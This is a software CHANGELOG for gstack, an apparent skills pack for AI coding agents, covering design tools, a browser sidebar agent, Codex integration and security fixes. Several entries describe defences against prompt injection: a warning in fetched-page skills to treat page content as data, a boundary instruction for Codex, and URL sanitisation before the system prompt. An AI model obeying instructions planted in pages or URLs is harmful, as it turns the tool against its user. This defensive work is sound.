- **Comparison board.** `$D compare` generates a self-contained HTML page with all variants, star ratings, per-variant feedback, regeneration controls, a remix grid (mix layout from A with colors from B), and a Submit button. Feedback flows back to the agent via HTTP POST, not DOM polling.
- **`/design-shotgun` skill.** Standalone design exploration you can run anytime. Generates multiple AI design variants, opens a comparison board in your browser, and iterates until you approve a direction. Session awareness (remembers prior explorations), taste memory (biases new generations toward your demonstrated preferences), screenshot-to-variants (screenshot what you don't like, get improvements), configurable variant count (3-8).
- **`$D serve` command.** HTTP server for the comparison board feedback loop. Serves the board on localhost, opens in your default browser, collects feedback via POST. Stateful: stays alive across regeneration rounds, supports same-tab reload via `/api/progress` polling.
- **`$D gallery` command.** Generates an HTML timeline of all design explorations for a project: every variant, feedback, organized by date.
- **Design memory.** `$D extract` analyzes an approved mockup with GPT-4o vision and writes colors, typography, spacing, and layout patterns to DESIGN.md. Future mockups on the same project inherit the established visual language.
- **Visual diffing.** `$D diff` compares two images and identifies differences by area with severity. `$D verify` compares a live site screenshot against an approved mockup, pass/fail gate.
- **Screenshot evolution.** `$D evolve` takes a screenshot of your live site and generates a mockup showing how it should look based on your feedback. Starts from reality, not blank canvas.
- **Responsive variants.** `$D variants --viewports desktop,tablet,mobile` generates mockups at multiple viewport sizes.
- **Design-to-code prompt.** `$D prompt` extracts implementation instructions from an approved mockup: exact hex colors, font sizes, spacing values, component structure. Zero interpretation gap.

### Changed

- **/office-hours** now generates visual mockup explorations by default (skippable). Comparison board opens in your browser for feedback before generating HTML wireframes.
- **/plan-design-review** uses `{{DESIGN_SHOTGUN_LOOP}}` for the comparison board. Can generate "what 10/10 looks like" mockups when a design dimension rates below 7/10.
- **/design-consultation** uses `{{DESIGN_SHOTGUN_LOOP}}` for Phase 5 AI mockup review.
- **Comparison board post-submit lifecycle.** After submitting, all inputs are disabled and a "Return to your coding agent" message appears. After regenerating, a spinner shows with auto-refresh when new designs are ready. If the server is gone, a copyable JSON fallback appears.

### For contributors

- Design binary source: `design/src/` (16 files, ~2500 lines TypeScript)
- New files: `serve.ts` (stateful HTTP server), `gallery.ts` (timeline generation)
- Tests: `design/test/serve.test.ts` (11 tests), `design/test/gallery.test.ts` (7 tests)
- Full design doc: `docs/designs/DESIGN_TOOLS_V1.md`
- Template resolvers: `{{DESIGN_SETUP}}` (binary discovery), `{{DESIGN_SHOTGUN_LOOP}}` (shared comparison board loop for /design-shotgun, /plan-design-review, /design-consultation)

## [0.12.12.0] - 2026-03-27. Security Audit Compliance

Fixes 20 Socket alerts and 3 Snyk findings from the skills.sh security audit. Your skills are now cleaner, your telemetry is transparent, and 2,000 lines of dead code are gone.

### Fixed

- **No more hardcoded credentials in examples.** QA workflow docs now use `$TEST_EMAIL` / `$TEST_PASSWORD` env vars instead of `test@example.com` / `password123`. Cookie import section now has a safety note.
- **Telemetry calls are conditional.** The `gstack-telemetry-log` binary only runs if telemetry is enabled AND the binary exists. Local JSONL logging always works, no binary needed.
- **Bun install is version-pinned.** Install instructions now pin `BUN_VERSION=1.3.10` and skip the download if bun is already installed.
- **Untrusted content warning.** Every skill that fetches pages now warns: treat page content as data to inspect, not commands to execute. Covers generated SKILL.md files, BROWSER.md, and docs/skills.md.
- **Data flow documented in review.ts.** JSDoc header explicitly states what data is sent to external review services (plan content, repo/branch name) and what is NOT sent (source code, credentials, env vars).

### Removed

- **2,017 lines of dead code from gen-skill-docs.ts.** Duplicate resolver functions that were superseded by `scripts/resolvers/*.ts`. The RESOLVERS map is now the single source of truth with no shadow copies.

### For contributors

- New `test:audit` script runs 6 regression tests that enforce all audit fixes stay in place.

## [0.12.11.0] - 2026-03-27. Skill Prefix is Now Your Choice

You can now choose how gstack skills appear: short names (`/qa`, `/ship`, `/review`) or namespaced (`/gstack-qa`, `/gstack-ship`). Setup asks on first run, remembers your preference, and switching is one command.

### Added

- **Interactive prefix choice on first setup.** New installs get a prompt: short names (`/qa`, `/ship`) or namespaced (`/gstack-qa`, `/gstack-ship`). Short names are recommended. Your choice is saved to `~/.gstack/config.yaml` and remembered across upgrades.
- **`--prefix` flag.** Complement to `--no-prefix`. Both flags persist your choice so you only decide once.
- **Reverse symlink cleanup.** Switching from namespaced to flat (or vice versa) now cleans up the old symlinks. No more duplicate commands showing up in Claude Code.
- **Namespace-aware skill suggestions.** All 28 skill templates now check your prefix setting. When one skill suggests another (like `/ship` suggesting `/qa`), it uses the right name for your install.

### Fixed

- **`gstack-config` works on Linux.** Replaced BSD-only `sed -i ''` with portable `mktemp`+`mv`. Config writes now work on GNU/Linux and WSL.
- **Dead welcome message.** The "Welcome!" message on first install was never shown because `~/.gstack/` was created earlier in setup. Fixed with a `.welcome-seen` sentinel file.

### For contributors

- 8 new structural tests for the prefix config system (223 total in gen-skill-docs).

## [0.12.10.0] - 2026-03-27. Codex Filesystem Boundary

Codex was wandering into `~/.claude/skills/` and following gstack's own instructions instead of reviewing your code. Now every codex prompt includes a boundary instruction that keeps it focused on the repository. Covers all 11 callsites across /codex, /autoplan, /review, /ship, /plan-eng-review, /plan-ceo-review, and /office-hours.

### Fixed

- **Codex stays in the repo.** All `codex exec` and `codex review` calls now prepend a filesystem boundary instruction telling Codex to ignore skill definition files. Prevents Codex from reading SKILL.md preamble scripts and wasting 8+ minutes on session tracking and upgrade checks.
- **Rabbit-hole detection.** If Codex output contains signs it got distracted by skill files (`gstack-config`, `gstack-update-check`, `SKILL.md`, `skills/gstack`), the /codex skill now warns and suggests a retry.
- **5 regression tests.** New test suite validates boundary text appears in all 7 codex-calling skills, the Filesystem Boundary section exists, the rabbit-hole detection rule exists, and autoplan uses cross-host-compatible path patterns.

## [0.12.9.0] - 2026-03-27. Community PRs: Faster Install, Skill Namespacing, Uninstall

Six community PRs landed in one batch. Install is faster, skills no longer collide with other tools, and you can cleanly uninstall gstack when needed.

### Added

- **Uninstall script.** `bin/gstack-uninstall` cleanly removes gstack from your system: stops browse daemons, removes all skill installs (Claude/Codex/Kiro), cleans up state. Supports `--force` (skip confirmation) and `--keep-state` (preserve config). (#323)
- **Python security patterns in /review.** Shell injection (`subprocess.run(shell=True)`), SSRF via LLM-generated URLs, stored prompt injection, async/sync mixing, and column name safety checks now fire automatically on Python projects. (#531)
- **Office-hours works without Codex.** The "second opinion" step now falls back to a Claude subagent when Codex CLI is unavailable, so every user gets the cross-model perspective. (#464)

### Changed

- **Faster install (~30s).** All clone commands now use `--single-branch --depth 1`. Full history available for contributors. (#484)
- **Skills namespaced with `gstack-` prefix.** Skill symlinks are now `gstack-review`, `gstack-ship`, etc. instead of bare `review`, `ship`. Prevents collisions with other skill packs. Old symlinks are auto-cleaned on upgrade. Use `--no-prefix` to opt out. (#503)

### Fixed

- **Windows port race condition.** `findPort()` now uses `net.createServer()` instead of `Bun.serve()` for port probing, fixing an EADDRINUSE race on Windows where the polyfill's `stop()` is fire-and-forget. (#490)
- **package.json version sync.** VERSION file and package.json now agree (was stuck at 0.12.5.0).

## [0.12.8.1] - 2026-03-27. zsh Glob Compatibility

Skill scripts now work correctly in zsh. Previously, bash code blocks in skill templates used raw glob patterns like `.github/workflows/*.yaml` and `ls ~/.gstack/projects/$SLUG/*-design-*.md` that would throw "no matches found" errors in zsh when no files matched. Fixed 38 instances across 13 templates and 2 resolvers using two approaches: `find`-based alternatives for complex patterns, and `setopt +o nomatch` guards for simple `ls` commands.

### Fixed

- **`.github/workflows/` globs replaced with `find`.** `cat .github/workflows/*deploy*`, `for f in .github/workflows/*.yml`, and `ls .github/workflows/*.yaml` patterns in `/land-and-deploy`, `/setup-deploy`, `/cso`, and the deploy bootstrap resolver now use `find ... -name` instead of raw globs.
- **`~/.gstack/` and `~/.claude/` globs guarded with `setopt`.** Design doc lookups, eval result listings, test plan discovery, and retro history checks across 10 skills now prepend `setopt +o nomatch 2>/dev/null || true` (no-op in bash, disables NOMATCH in zsh).
- **Test framework detection globs guarded.** `ls jest.config.* vitest.config.*` in the testing resolver now has a setopt guard.

## [0.12.8.0] - 2026-03-27. Codex No Longer Reviews the Wrong Project

When you run gstack in Conductor with multiple workspaces open, Codex could silently review the wrong project. The `codex exec -C` flag resolved the repo root inline via `$(git rev-parse --show-toplevel)`, which evaluates in whatever cwd the background shell inherits. In multi-workspace environments, that cwd might be a different project entirely.

### Fixed

- **Codex exec resolves repo root eagerly.** All 12 `codex exec` commands across `/codex`, `/autoplan`, and 4 resolver functions now resolve `_REPO_ROOT` at the top of each bash block and reference the stored value in `-C`. No more inline evaluation that races with other workspaces.
- **`codex review` also gets cwd protection.** `codex review` doesn't support `-C`, so it now gets `cd "$_REPO_ROOT"` before invocation. Same class of bug, different command.
- **Silent fallback replaced with hard fail.** The `|| pwd` fallback silently used whatever random cwd was available. Now it errors out with a clear message if not in a git repo.

### Removed

- **Dead resolver copies in gen-skill-docs.ts.** Six functions that were moved to `scripts/resolvers/` months ago but never deleted. They had already diverged from the live versions and contained the old vulnerable pattern.

### Added

- **Regression test** that scans all `.tmpl`, resolver `.ts`, and generated `SKILL.md` files for codex commands using inline `$(git rev-parse --show-toplevel)`. Prevents reintroduction.

## [0.12.7.0] - 2026-03-27. Community PRs + Security Hardening

Seven community contributions merged, reviewed, and tested. Plus security hardening for telemetry and review logging, and E2E test stability fixes.

### Added

- **Dotfile filtering in skill discovery.** Hidden directories (`.git`, `.vscode`, etc.) are no longer picked up as skill templates.
- **JSON validation gate in review-log.** Malformed input is rejected instead of appended to the JSONL file.
- **Telemetry input sanitization.** All string fields are stripped of quotes, backslashes, and control characters before being written to JSONL.
- **Host-specific co-author trailers.** `/ship` and `/document-release` now use the correct co-author line for Codex vs Claude.
- **10 new security tests** covering telemetry injection, review-log validation, and dotfile filtering.

### Fixed

- **File paths starting with `./` no longer treated as CSS selectors.** `$B screenshot ./path/to/file.png` now works instead of trying to find a CSS element.
- **Build chain resilience.** `gen:skill-docs` failure no longer blocks binary compilation.
- **Update checker fall-through.** After upgrading, the checker now also checks for newer remote versions instead of stopping.
- **Flaky E2E tests stabilized.** `browse-basic`, `ship-base-branch`, and `review-dashboard-via` tests now pass reliably by extracting only relevant SKILL.md sections instead of copying full 1900-line files into test fixtures.
- **Removed unreliable `journey-think-bigger` routing test.** Never passed reliably because the routing signal was too ambiguous. 10 other journey tests cover routing with clear signals.

### For contributors

- New CLAUDE.md rule: never copy full SKILL.md files into E2E test fixtures. Extract the relevant section only.

## [0.12.6.0] - 2026-03-27. Sidebar Knows What Page You're On

The Chrome sidebar agent used to navigate to the wrong page when you asked it to do something. If you'd manually browsed to a site, the sidebar would ignore that and go to whatever Playwright last saw (often Hacker News from the demo). Now it works.

### Fixed

- **Sidebar uses the real tab URL.** The Chrome extension now captures the actual page URL via `chrome.tabs.query()` and sends it to the server. Previously the sidebar agent used Playwright's stale `page.url()`, which didn't update when you navigated manually in headed mode.
- **URL sanitization.** The extension-provided URL is validated (http/https only, control characters stripped, 2048 char limit) before being used in the Claude system prompt. Prevents prompt injection via crafted URLs.
- **Stale sidebar agents killed on reconnect.** Each `/connect-chrome` now kills leftover sidebar-agent processes before starting a new one. Old agents had stale auth tokens and would silently fail, causing the sidebar to freeze.

### Added

- **Pre-flight cleanup for `/connect-chrome`.** Kills stale browse servers and cleans Chromium profile locks before connecting. Prevents "already connected" false positives after crashes.
- **Sidebar agent test suite (36 tests).** Four layers: unit tests for URL sanitization, integration tests for server HTTP endpoints, mock-Claude round-trip tests, and E2E tests with real Claude. All free except layer 4.

## [0.12.5.1] - 2026-03-27. Eng Review Now Tells You What to Parallelize

`/plan-eng-review` automatically analyzes your plan for parallel execution opportunities. When your plan has independent workstreams, the review outputs a dependency table, parallel lanes, and execution order so you know exactly which tasks to split into separate git worktrees.

### Added

- **Worktree parallelization strategy** in `/plan-eng-review` required outputs. Extracts a structured table of plan steps with module-level dependencies, computes parallel lanes, and flags merge conflict risks. Skips automatically for single-module or single-track plans.

## [0.12.5.0] - 2026-03-26. Fix Codex Hangs: 30-Minute Waits Are Gone

Three bugs in `/codex` caused 30+ minute hangs with zero output during plan reviews and adversarial checks. All three are fixed.

### Fixed

- **Plan files now visible to Codex sandbox.** Codex runs sandboxed to the repo root and couldn't see plan files at `~/.claude/plans/`. It would waste 10+ tool calls searching before giving up. Now the plan content is embedded directly in the prompt, and referenced source files are listed so Codex reads them immediately.
- **Streaming output actually streams.** Python's stdout buffering meant zero output visible until the process exited. Added `PYTHONUNBUFFERED=1`, `python3 -u`, and `flush=True` on every print call across all three Codex modes.
- **Sane reasoning effort defaults.** Replaced hardcoded `xhigh` (23x more tokens, known 50+ min hangs per OpenAI issues #8545, #8402, #6931) with per-mode defaults: `high` for review and challenge, `medium` for consult. Users can override with `--xhigh` flag when they want maximum reasoning.
- **`--xhigh` override works in all modes.** The override reminder was missing from challenge and consult mode instructions. Found by adversarial review.

## [0.12.4.0] - 2026-03-26. Full Commit Coverage in /ship

When you ship a branch with 12 commits spanning performance work, dead code removal, and test infra, the PR should mention all three. It wasn't. The CHANGELOG and PR summary biased toward whatever happened most recently, silently dropping earlier work.

### Fixed

- **/ship Step 5 (CHANGELOG):** Now forces explicit commit enumeration before writing. You list every commit, group by theme, write the entry, then cross-check that every commit maps to a bullet. No more recency bias.
- **/ship Step 8 (PR body):** Changed from "bullet points from CHANGELOG" to explicit commit-by-commit coverage. Groups commits into logical sections. Excludes the VERSION/CHANGELOG metadata commit (bookkeeping, not a change). Every substantive commit must appear somewhere.

## [0.12.3.0] - 2026-03-26. Voice Directive: Every Skill Sounds Like a Builder

Every gstack skill now has a voice. Not a personality, not a persona, but a consistent set of instructions that make Claude sound like someone who shipped code today and cares whether the thing works for real users. Direct, concrete, sharp. Names the file, the function, the command. Connects technical work to what the user actually experiences.

Two tiers: lightweight skills get a trimmed version (tone + writing rules). Full skills get the complete directive with context-dependent tone (YC partner energy for strategy, senior eng for code review, blog-post clarity for debugging), concreteness standards, humor calibration, and user-outcome guidance.

### Added

- **Voice directive in all 25 skills.** Generated from `preamble.ts`, injected via the template resolver. Tier 1 skills get a 4-line version. Tier 2+ skills get the full directive.
- **Context-dependent tone.** Match the context: YC partner for `/plan-ceo-review`, senior eng for `/review`, best-technical-blog-post for `/investigate`.
- **Concreteness standard.** "Show the exact command. Use real numbers. Point at the exact line." Not aspirational... enforced.
- **User outcome connection.** "This matters because your user will see a 3-second spinner." Make the user's user real.
- **LLM eval test.** Judge scores directness, concreteness, anti-corporate tone, AI vocabulary avoidance, and user outcome connection. All dimensions must score 4/5+.

## [0.12.2.0] - 2026-03-26. Deploy with Confidence: First-Run Dry Run

The first time you run `/land-and-deploy` on a project, it does a dry run. It detects your deploy infrastructure, tests that every command works, and shows you exactly what will happen... before it touches anything. You confirm, and from then on it just works.

If your deploy config changes later (new platform, different workflow, updated URLs), it automatically re-runs the dry run. Trust is earned, maintained, and re-validated when the ground shifts.

### Added

- **First-run dry run.** Shows your deploy infrastructure in a validation table: platform, CLI status, production URL reachability, staging detection, merge method, merge queue status. You confirm before anything irreversible happens.
- **Staging-first option.** If staging is detected (CLAUDE.md config, GitHub Actions workflow, or Vercel/Netlify preview), you can deploy there first, verify it works, then proceed to production.
- **Config decay detection.** The dry-run confirmation stores a fingerprint of your deploy config. If CLAUDE.md's deploy section or your deploy workflows change, the dry run re-triggers automatically.
- **Inline review gate.** If no recent code review exists, offers a quick safety check on the diff before merging. Catches SQL safety, race conditions, and security issues at deploy time.
- **Merge queue awareness.** Detects when your repo uses merge queues and explains what's happening while it waits.
- **CI auto-deploy detection.** Identifies deploy workflows triggered by the merge and monitors them.

### Changed

- **Full copy rewrite.** Every user-facing message rewritten to narrate what's happening, explain why, and be specific. First run = teacher mode. Subsequent runs = efficient mode.
- **Voice & Tone section.** New guidelines for how the skill communicates: be a senior release engineer sitting next to the developer, not a robot.

## [0.12.1.0] - 2026-03-26. Smarter Browsing: Network Idle, State Persistence, Iframes

Every click, fill, and select now waits for the page to settle before returning. No more stale snapshots because an XHR was still in-flight. Chain accepts pipe-delimited format for faster multi-step flows. You can save and restore browser sessions (cookies + open tabs). And iframe content is now reachable.

### Added

- **Network idle detection.** `click`, `fill`, and `select` auto-wait up to 2s for network requests to settle before returning. Catches XHR/fetch triggered by interactions. Uses Playwright's built-in `waitForLoadState('networkidle')`, not a custom tracker.

- **`$B state save/load`.** Save your browser session (cookies + open tabs) to a named file, load it back later. Files stored at `.gstack/browse-states/{name}.json` with 0o600 permissions. V1 saves cookies + URLs only (not localStorage, which breaks on load-before-navigate). Load replaces the current session, not merge.

- **`$B frame` command.** Switch command context into an iframe: `$B frame iframe`, `$B frame --name checkout`, `$B frame --url stripe`, or `$B frame @e5`. All subsequent commands (click, fill, snapshot, etc.) operate inside the iframe. `$B frame main` returns to the main page. Snapshot shows `[Context: iframe src="..."]` header. Detached frames auto-recover.

- **Chain pipe format.** Chain now accepts `$B chain 'goto url | click @e5 | snapshot -ic'` as a fallback when JSON parsing fails. Pipe-delimited with quote-aware tokenization.

### Changed

- **Chain post-loop idle wait.** After executing all commands in a chain, if the last was a write command, chain waits for network idle before returning.

### Fixed

- **Iframe ref scoping.** Snapshot ref locators, cursor-interactive scan, and cursor locators now use the frame-aware target instead of always scoping to the main page.
- **Detached frame recovery.** `getActiveFrameOrPage()` checks `isDetached()` and auto-recovers.
- **State load resets frame context.** Loading a saved state clears the active frame reference.
- **elementHandle leak in frame command.** Now properly disposed after getting contentFrame.
- **Upload command frame-aware.** `upload` uses the frame-aware target for file input locators.

## [0.12.0.0] - 2026-03-26. Headed Mode + Sidebar Agent

You can now watch Claude work in a real Chrome window and direct it from a sidebar chat.

### Added

- **Headed mode with sidebar agent.** `$B connect` launches a visible Chrome window with the gstack extension. The Side Panel shows a live activity feed of every command AND a chat interface where you type natural language instructions. A child Claude instance executes your requests in the browser ... navigate pages, click buttons, fill forms, extract data. Each task gets up to 5 minutes.

- **Personal automation.** The sidebar agent handles repetitive browser tasks beyond dev workflows. Browse your kid's school parent portal and add parent contact info to Google Contacts. Fill out vendor onboarding forms. Extract data from dashboards. Log in once in the headed browser or import cookies from your real Chrome with `/setup-browser-cookies`.

- **Chrome extension.** Toolbar badge (green=connected, gray=not), Side Panel with activity feed + chat + refs tab, @ref overlays on the page, and a connection pill showing which window gstack controls. Auto-loads when you run `$B connect`.

- **`/connect-chrome` skill.** Guided setup: launches Chrome, verifies the extension, demos the activity feed, and introduces the sidebar chat.

### Changed

- **Sidebar agent ungated.** Previously required `--chat` flag. Now always available in headed mode. The sidebar agent has the same security model as Claude Code itself (Bash, Read, Glob, Grep on localhost).

- **Agent timeout raised to 5 minutes.** Multi-page tasks (navigating directories, filling forms across pages) need more than the previous 2-minute limit.

## [0.11.21.0] - 2026-03-26

### Fixed

- **`/autoplan` reviews now count toward the ship readiness gate.** When `/autoplan` ran full CEO + Design + Eng reviews, `/ship` still showed "0 runs" for Eng Review because autoplan-logged entries weren't being read correctly. Now the dashboard shows source attribution (e.g., "CLEAR (PLAN via /autoplan)") so you can see exactly which tool satisfied each review.
- **`/ship` no longer tells you to "run /review first."** Ship runs its own pre-landing review in Step 3.5. asking you to run the same review separately was redundant. The gate is removed; ship just does it.
- **`/land-and-deploy` now checks all 8 review types.** Previously missed `review`, `adversarial-review`, and `codex-plan-review`. if you only ran `/review` (not `/plan-eng-review`), land-and-deploy wouldn't see it.
- **Dashboard Outside Voice row now works.** Was showing "0 runs" even after outside voices ran in `/plan-ceo-review` or `/plan-eng-review`. Now correctly maps to `codex-plan-review` entries.
- **`/codex review` now tracks staleness.** Added the `commit` field to codex review log entries so the dashboard can detect when a codex review is outdated.
- **`/autoplan` no longer hardcodes "clean" status.** Review log entries from autoplan used to always record `status:"clean"` even when issues were found. Now uses proper placeholder tokens that Claude substitutes with real values.

## [0.11.20.0] - 2026-03-26

### Added

- **GitLab support for `/retro` and `/ship`.** You can now run `/ship` on GitLab repos. it creates merge requests via `glab mr create` instead of `gh pr create`. `/retro` detects default branches on both platforms. All 11 skills using `BASE_BRANCH_DETECT` automatically get GitHub, GitLab, and git-native fallback detection.
- **GitHub Enterprise and self-hosted GitLab detection.** If the remote URL doesn't match `github.com` or `gitlab`, gstack checks `gh auth status` / `glab auth status` to detect authenticated platforms. no manual config needed.
- **`/document-release` works on GitLab.** After `/ship` creates a merge request, the auto-invoked `/document-release` reads and updates the MR body via `glab` instead of failing silently.
- **GitLab safety gate for `/land-and-deploy`.** Instead of silently failing on GitLab repos, `/land-and-deploy` now stops early with a clear message that GitLab merge support is not yet implemented.

### Fixed

- **Deduplicated gen-skill-docs resolvers.** The template generator had duplicate inline resolver functions that shadowed the modular versions, causing generated SKILL.md files to miss recent resolver updates.

## [0.11.19.0] - 2026-03-24

### Fixed

- **Auto-upgrade no longer breaks.** The root gstack skill description was 7 characters from the Codex 1024-char limit. Every new skill addition pushed it closer. Moved the skill routing table from the description (bounded) to the body (unlimited), dropping from 1017 to 409 chars with 615 chars of headroom.
- **Codex reviews now run in the correct repo.** In multi-workspace setups (like Conductor), Codex could pick up the wrong project directory. All `codex exec` calls now explicitly set `-C` to the git root.

### Added

- **900-char early warning test.** A new test fails if any Codex skill description exceeds 900 chars, catching description bloat before it breaks builds.

## [0.11.18.2] - 2026-03-24

### Fixed

- **Windows browse daemon fixed.** The browse server wouldn't start on Windows because Bun requires `stdio` as an array (`['ignore', 'ignore', 'ignore']`), not a string (`'ignore'`). Fixes #448, #454, #458.

## [0.11.18.1] - 2026-03-24

### Changed

- **One decision per question. everywhere.** Every skill now presents decisions one at a time, each with its own focused question, recommendation, and options. No more wall-of-text questions that bundle unrelated choices together. This was already enforced in the three plan-review skills; now it's a universal rule across all 23+ skills.

## [0.11.18.0] - 2026-03-24. Ship With Teeth

`/ship` and `/review` now actually enforce the quality gates they've been talking about. Coverage audit becomes a real gate (not just a diagram), plan completion gets verified against the diff, and verification steps from your plan run automatically.

### Added

- **Test coverage gate in /ship.** AI-assessed coverage below 60% is a hard stop. 60-79% gets a prompt. 80%+ passes. Thresholds are configurable per-project via `## Test Coverage` in CLAUDE.md.
- **Coverage warning in /review.** Low coverage is now flagged prominently before you reach the /ship gate, so you can write tests early.
- **Plan completion audit.** /ship reads your plan file, extracts every actionable item, cross-references against the diff, and shows you a DONE/NOT DONE/PARTIAL/CHANGED checklist. Missing items are a shipping blocker (with override).
- **Plan-aware scope drift detection.** /review's scope drift check now reads the plan file too. not just TODOS.md and PR description.
- **Auto-verification via /qa-only.** /ship reads your plan's verification section and runs /qa-only inline to test it. if a dev server is running on localhost. No server, no problem. it skips gracefully.
- **Shared plan file discovery.** Conversation context first, content-based grep fallback second. Used by plan completion, plan review reports, and verification.
- **Ship metrics logging.** Coverage %, plan completion ratio, and verification results are logged to review JSONL for /retro to track trends.
- **Plan completion in /retro.** Weekly retros now show plan completion rates across shipped branches.

## [0.11.17.0] - 2026-03-24. Cleaner Skill Descriptions + Proactive Opt-Out

### Changed

- **Skill descriptions are now clean and readable.** Removed the ugly "MANUAL TRIGGER ONLY" prefix from every skill description that was wasting 58 characters and causing build errors for Codex integration.
- **You can now opt out of proactive skill suggestions.** The first time you run any gstack skill, you'll be asked whether you want gstack to suggest skills during your workflow. If you prefer to invoke skills manually, just say no. it's saved as a global setting. You can change your mind anytime with `gstack-config set proactive true/false`.

### Fixed

- **Telemetry source tagging no longer crashes.** Fixed duration guards and source field validation in the telemetry logger so it handles edge cases cleanly instead of erroring.

## [0.11.16.1] - 2026-03-24. Installation ID Privacy Fix

### Fixed

- **Installation IDs are now random UUIDs instead of hostname hashes.** The old `SHA-256(hostname+username)` approach meant anyone who knew your machine identity could compute your installation ID. Now uses a random UUID stored in `~/.gstack/installation-id`. not derivable from any public input, rotatable by deleting the file.
- **RLS verification script handles edge cases.** `verify-rls.sh` now correctly treats INSERT success as expected (kept for old client compat), handles 409 conflicts and 204 no-ops.

## [0.11.16.0] - 2026-03-24. Smarter CI + Telemetry Security

### Changed

- **CI runs only gate tests by default. periodic tests run weekly.** Every E2E test is now classified as `gate` (blocks PRs) or `periodic` (weekly cron + on-demand). Gate tests cover functional correctness and safety guardrails. Periodic tests cover expensive Opus quality benchmarks, non-deterministic routing tests, and tests requiring external services (Codex, Gemini). CI feedback is faster and cheaper while quality benchmarks still run weekly.
- **Global touchfiles are now granular.** Previously, changing `gen-skill-docs.ts` triggered all 56 E2E tests. Now only the ~27 tests that actually depend on it run. Same for `llm-judge.ts`, `test-server.ts`, `worktree.ts`, and the Codex/Gemini session runners. The truly global list is down to 3 files (session-runner, eval-store, touchfiles.ts itself).
- **New `test:gate` and `test:periodic` scripts** replace `test:e2e:fast`. Use `EVALS_TIER=gate` or `EVALS_TIER=periodic` to filter tests by tier.
- **Telemetry sync uses `GSTACK_SUPABASE_URL` instead of `GSTACK_TELEMETRY_ENDPOINT`.** Edge functions need the base URL, not the REST API path. The old variable is removed from `config.sh`.
- **Cursor advancement is now safe.** The sync script checks the edge function's `inserted` count before advancing. if zero events were inserted, the cursor holds and retries next run.

### Fixed

- **Telemetry RLS policies tightened.** Row-level security policies on all telemetry tables now deny direct access via the anon key. All reads and writes go through validated edge functions with schema checks, event type allowlists, and field length limits.
- **Community dashboard is faster and server-cached.** Dashboard stats are now served from a single edge function with 1-hour server-side caching, replacing multiple direct queries.

### For contributors

- `E2E_TIERS` map in `test/helpers/touchfiles.ts` classifies every test. a free validation test ensures it stays in sync with `E2E_TOUCHFILES`
- `EVALS_FAST` / `FAST_EXCLUDED_TESTS` removed in favor of `EVALS_TIER`
- `allow_failure` removed from CI matrix (gate tests should be reliable)
- New `.github/workflows/evals-periodic.yml` runs periodic tests Monday 6 AM UTC
- New migration: `supabase/migrations/002_tighten_rls.sql`
- New smoke test: `supabase/verify-rls.sh` (9 checks: 5 reads + 4 writes)
- Extended `test/telemetry.test.ts` with field name verification
- Untracked `browse/dist/` binaries from git (arm64-only, rebuilt by `./setup`)

## [0.11.15.0] - 2026-03-24. E2E Test Coverage for Plan Reviews & Codex

### Added

- **E2E tests verify plan review reports appear at the bottom of plans.** The `/plan-eng-review` review report is now tested end-to-end. if it stops writing `## GSTACK REVIEW REPORT` to the plan file, the test catches it.
- **E2E tests verify Codex is offered in every plan skill.** Four new lightweight tests confirm that `/office-hours`, `/plan-ceo-review`, `/plan-design-review`, and `/plan-eng-review` all check for Codex availability, prompt the user, and handle the fallback when Codex is unavailable.

### For contributors

- New E2E tests in `test/skill-e2e-plan.test.ts`: `plan-review-report`, `codex-offered-eng-review`, `codex-offered-ceo-review`, `codex-offered-office-hours`, `codex-offered-design-review`
- Updated touchfile mappings and selection count assertions
- Added `touchfiles` to the documented global touchfile list in CLAUDE.md

## [0.11.14.0] - 2026-03-24. Windows Browse Fix

### Fixed

- **Browse engine now works on Windows.** Three compounding bugs blocked all Windows `/browse` users: the server process died when the CLI exited (Bun's `unref()` doesn't truly detach on Windows), the health check never ran because `process.kill(pid, 0)` is broken in Bun binaries on Windows, and Chromium's sandbox failed when spawned through the Bun→Node process chain. All three are now fixed. Credits to @fqueiro (PR #191) for identifying the `detached: true` approach.
- **Health check runs first on all platforms.** `ensureServer()` now tries an HTTP health check before falling back to PID-based detection. more reliable on every OS, not just Windows.
- **Startup errors are logged to disk.** When the server fails to start, errors are written to `~/.gstack/browse-startup-error.log` so Windows users (who lose stderr due to process detachment) can debug.
- **Chromium sandbox disabled on Windows.** Chromium's sandbox requires elevated privileges when spawned through the Bun→Node chain. now disabled on Windows only.

### For contributors

- New tests for `isServerHealthy()` and startup error logging in `browse/test/config.test.ts`

## [0.11.13.0] - 2026-03-24. Worktree Isolation + Infrastructure Elegance

### Added

- **E2E tests now run in git worktrees.** Gemini and Codex tests no longer pollute your working tree. Each test suite gets an isolated worktree, and useful changes the AI agent makes are automatically harvested as patches you can cherry-pick. Run `git apply ~/.gstack-dev/harvests/<id>/gemini.patch` to grab improvements.
- **Harvest deduplication.** If a test keeps producing the same improvement across runs, it's detected via SHA-256 hash and skipped. no duplicate patches piling up.
- **`describeWithWorktree()` helper.** Any E2E test can now opt into worktree isolation with a one-line wrapper. Future tests that need real repo context (git history, real diff) can use this instead of tmpdirs.

### Changed

- **Gen-skill-docs is now a modular resolver pipeline.** The monolithic 1700-line generator is split into 8 focused resolver modules (browse, preamble, design, review, testing, utility, constants, codex-helpers). Adding a new placeholder resolver is now a single file instead of editing a megafunction.
- **Eval results are project-scoped.** Results now live in `~/.gstack/projects/$SLUG/evals/` instead of the global `~/.gstack-dev/evals/`. Multi-project users no longer get eval results mixed together.

### For contributors

- WorktreeManager (`lib/worktree.ts`) is a reusable platform module. future skills like `/batch` can import it directly.
- 12 new unit tests for WorktreeManager covering lifecycle, harvest, dedup, and error handling.
- `GLOBAL_TOUCHFILES` updated so worktree infrastructure changes trigger all E2E tests.

## [0.11.12.0] - 2026-03-24. Triple-Voice Autoplan

Every `/autoplan` phase now gets two independent second opinions. one from Codex (OpenAI's frontier model) and one from a fresh Claude subagent. Three AI reviewers looking at your plan from different angles, each phase building on the last.

### Added

- **Dual voices in every autoplan phase.** CEO review, Design review, and Eng review each run both a Codex challenge and an independent Claude subagent simultaneously. You get a consensus table showing where the models agree and disagree. disagreements surface as taste decisions at the final gate.
- **Phase-cascading context.** Codex gets prior-phase findings as context (CEO concerns inform Design review, CEO+Design inform Eng). Claude subagent stays truly independent for genuine cross-model validation.
- **Structured consensus tables.** CEO phase scores 6 strategic dimensions, Design uses the litmus scorecard, Eng scores 6 architecture dimensions. CONFIRMED/DISAGREE for each.
- **Cross-phase synthesis.** Phase 4 gate highlights themes that appeared independently in multiple phases. high-confidence signals when different reviewers catch the same issue.
- **Sequential enforcement.** STOP markers between phases + pre-phase checklists prevent autoplan from accidentally parallelizing CEO/Design/Eng (each phase depends on the previous).
